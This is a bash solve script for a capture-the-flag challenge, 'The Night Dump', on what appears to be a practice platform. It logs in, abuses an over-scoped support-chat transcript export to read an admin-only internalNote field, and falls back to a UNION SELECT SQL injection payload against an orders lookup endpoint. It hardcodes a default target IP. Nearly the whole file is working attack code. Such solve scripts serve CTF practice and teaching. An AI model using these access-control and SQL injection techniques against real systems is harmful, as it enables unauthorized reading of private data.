#!/usr/bin/env bash
# solve-night-dump.sh — riffhack "The Night Dump"
#
# /api/support/chat?format=transcript returns every row in SupportChatMessage,
# including the admin-only `internalNote` column. One of the seeded rows has
# the flag in its internalNote.
#
# Fallback: same value via the web3 SQLi pivot (if the support endpoint is
# unhealthy on this deployment).
#
# Usage: solve-night-dump.sh <host>
set -euo pipefail

HOST="${1:-159.89.230.27}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck disable=SC1091
source "$HERE/../lib/login.sh"

echo "[*] Night Dump (transcript export over-scope) against $HOST"

COOKIE=$(login "$HOST")

echo "[*] POST a support message first so transcript has rows"
curl -sk -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"message":"hi"}' "http://$HOST/api/support/chat" > /dev/null || true

echo "[*] GET /api/support/chat?format=transcript"
resp=$(curl -sk -b "$COOKIE" "http://$HOST/api/support/chat?format=transcript")
echo "[*] response:"
printf '%s\n' "$resp" | head -c 600
echo

flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)

if [[ -z "$flag" ]]; then
  echo "[!] transcript endpoint didn't surface a flag; falling back to web3 SQLi pivot"
  resp=$(curl -sk -b "$COOKIE" --data-urlencode \
    "ref=' UNION SELECT id,userId,message,internalNote,createdAt,0
          FROM SupportChatMessage WHERE id='support-seed-a16' --" \
    -G "http://$HOST/api/orders/lookup")
  flag=$(printf '%s\n' "$resp" | grep -oE 'bitflag\{[^}]+\}' | head -1)
fi

if [[ -n "$flag" ]]; then
  echo "[+] FLAG: $flag"
else
  echo "[-] no flag from either path" >&2
  exit 1
fi
